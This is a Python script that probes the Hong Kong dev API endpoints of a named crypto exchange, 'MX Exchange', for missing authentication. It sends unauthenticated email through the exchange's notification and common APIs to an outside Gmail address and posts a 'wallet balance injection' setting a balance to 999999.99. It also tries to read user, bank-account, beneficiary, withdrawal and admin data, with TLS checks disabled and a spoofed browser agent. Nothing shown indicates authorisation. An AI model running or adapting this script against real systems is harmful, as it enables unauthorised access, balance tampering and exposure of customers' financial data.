import requests, json, sys, urllib3
urllib3.disable_warnings()

S = requests.Session()
S.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Content-Type": "application/json",
    "Accept": "application/json",
})
TIMEOUT = 15

def test(method, url, data=None, label=""):
    try:
        if method == "GET":
            r = S.get(url, timeout=TIMEOUT, verify=False)
        elif method == "POST":
            r = S.post(url, json=data, timeout=TIMEOUT, verify=False)
        elif method == "PUT":
            r = S.put(url, json=data, timeout=TIMEOUT, verify=False)
        elif method == "DELETE":
            r = S.delete(url, timeout=TIMEOUT, verify=False)
        else:
            return
        body = r.text[:500]
        status = "AUTH_BYPASS" if r.status_code in (200,201,204) else f"{r.status_code}"
        tag = "[!!!]" if r.status_code in (200,201,204) else "[x]" if r.status_code == 401 else "[?]"
        print(f"  {tag} {method} {url.split('.exchange')[1] if '.exchange' in url else url}")
        print(f"      => {status} ({len(r.text)}b) {body[:200]}")
        if r.status_code in (200, 201, 204):
            print(f"      *** CRITICAL: NO AUTH REQUIRED ***")
        return r
    except Exception as e:
        print(f"  [E] {method} {url} => {e}")
        return None

print("=" * 70)
print("MX EXCHANGE — HK DEV ENDPOINTS — NO AUTH TEST")
print("=" * 70)

# ========== NOTIFICATION API ==========
NOTIF = "https://notificationhkdev.mx.exchange"
print(f"\n{'='*60}")
print(f"NOTIFICATION API ({NOTIF})")
print(f"{'='*60}")

# Email sending — THE BIG ONE
print("\n--- Email Endpoints ---")
test("POST", f"{NOTIF}/api/Email", {
    "from": "test@mx.exchange",
    "to": "tr4nsh4cks@gmail.com",
    "subject": "Security Test MX Exchange",
    "body": "<h1>Auth bypass test</h1><p>If you receive this, the email endpoint has no auth.</p>",
    "isHtml": True
}, "Send email without auth")

test("GET", f"{NOTIF}/api/Email", label="List emails")

# TestHub — balance manipulation via SignalR
print("\n--- TestHub Endpoints ---")
test("POST", f"{NOTIF}/api/TestHub/WalletUpdate", {
    "userId": "00000000-0000-0000-0000-000000000001",
    "currencyId": 1,
    "balance": 999999.99,
    "available": 999999.99
}, "Wallet balance injection")

test("POST", f"{NOTIF}/api/TestHub/TransferPendingCount", {
    "userId": "00000000-0000-0000-0000-000000000001",
    "count": 0
}, "Transfer pending count")

test("POST", f"{NOTIF}/api/TestHub", {
    "message": "test"
}, "Generic TestHub")

# ========== COMMON API ==========
COMMON = "https://commonhkdev.mx.exchange"
print(f"\n{'='*60}")
print(f"COMMON API ({COMMON})")
print(f"{'='*60}")

# Read endpoints first
print("\n--- Read Endpoints ---")
test("GET", f"{COMMON}/api/Country", label="List countries")
test("GET", f"{COMMON}/api/Currency", label="List currencies")
test("GET", f"{COMMON}/api/Currency/1", label="Get currency 1")
test("GET", f"{COMMON}/api/Market", label="List markets")
test("GET", f"{COMMON}/api/Market/1", label="Get market 1")
test("GET", f"{COMMON}/api/Fee", label="List fees")
test("GET", f"{COMMON}/api/Fee/1", label="Get fee 1")

# Email send via Common
print("\n--- Common Email ---")
test("POST", f"{COMMON}/api/Email/send", {
    "to": "tr4nsh4cks@gmail.com",
    "subject": "Common API test",
    "body": "Test from Common API",
    "isHtml": False
}, "Email via Common API")

# ========== ACCOUNT API ==========
ACCT = "https://accounthkdev.mx.exchange"
print(f"\n{'='*60}")
print(f"ACCOUNT API ({ACCT})")
print(f"{'='*60}")

print("\n--- User Endpoints ---")
test("GET", f"{ACCT}/api/users", label="List users")
test("GET", f"{ACCT}/api/users/1", label="Get user 1")
test("GET", f"{ACCT}/api/users/profile", label="User profile")

print("\n--- Auth Endpoints ---")
test("POST", f"{ACCT}/api/auth/login", {
    "email": "test@test.com",
    "password": "test123"
}, "Login attempt")

test("POST", f"{ACCT}/api/auth/register", {
    "email": "test@test.com",
    "password": "Test1234!",
    "firstName": "Test",
    "lastName": "User"
}, "Register attempt")

test("POST", f"{ACCT}/api/users/register", {
    "email": "test@test.com",
    "password": "Test1234!",
    "firstName": "Test",
    "lastName": "User"
}, "Register via /users/register")

test("POST", f"{ACCT}/api/account/register", {
    "email": "test@test.com",
    "password": "Test1234!",
    "firstName": "Test",
    "lastName": "User"
}, "Register via /account/register")

print("\n--- Bank/Beneficiary Endpoints ---")
test("GET", f"{ACCT}/api/bankaccount", label="List bank accounts")
test("GET", f"{ACCT}/api/beneficiary", label="List beneficiaries")
test("GET", f"{ACCT}/api/broker", label="List brokers")
test("GET", f"{ACCT}/api/admin/users", label="Admin users")

# ========== WALLET API ==========
WALLET = "https://wallethkdev.mx.exchange"
print(f"\n{'='*60}")
print(f"WALLET API ({WALLET})")
print(f"{'='*60}")

print("\n--- Wallet Endpoints ---")
test("GET", f"{WALLET}/api/wallet", label="List wallets")
test("GET", f"{WALLET}/api/wallet/1", label="Get wallet 1")
test("GET", f"{WALLET}/api/wallet/balance", label="Wallet balance")
test("GET", f"{WALLET}/api/deposit", label="List deposits")
test("GET", f"{WALLET}/api/withdrawal", label="List withdrawals")
test("GET", f"{WALLET}/api/transfer", label="List transfers")
test("GET", f"{WALLET}/api/address", label="Wallet addresses")
test("GET", f"{WALLET}/api/currency", label="Currencies via wallet")

# ========== ORDERBOOK API ==========
OB = "https://orderbookhkdev.mx.exchange"
print(f"\n{'='*60}")
print(f"ORDERBOOK API ({OB})")
print(f"{'='*60}")

print("\n--- OrderBook Endpoints ---")
test("GET", f"{OB}/api/orderbook", label="List orderbooks")
test("GET", f"{OB}/api/orderbook/1", label="Get orderbook 1")
test("GET", f"{OB}/api/order", label="List orders")
test("GET", f"{OB}/api/trade", label="List trades")
test("GET", f"{OB}/api/execution", label="List executions")
test("GET", f"{OB}/api/market", label="Markets via orderbook")

# ========== ADMIN DASHBOARD ==========
ADMIN = "https://admin-hkdev.mx.exchange"
print(f"\n{'='*60}")
print(f"ADMIN DASHBOARD ({ADMIN})")
print(f"{'='*60}")

print("\n--- Admin API Endpoints ---")
test("GET", f"{ADMIN}/api/users", label="Admin users list")
test("GET", f"{ADMIN}/api/dashboard", label="Dashboard data")
test("GET", f"{ADMIN}/api/admin/stats", label="Admin stats")
test("GET", f"{ADMIN}/api/settings", label="Settings")

print(f"\n{'='*70}")
print("DONE — check [!!!] entries for auth bypass")
print(f"{'='*70}")
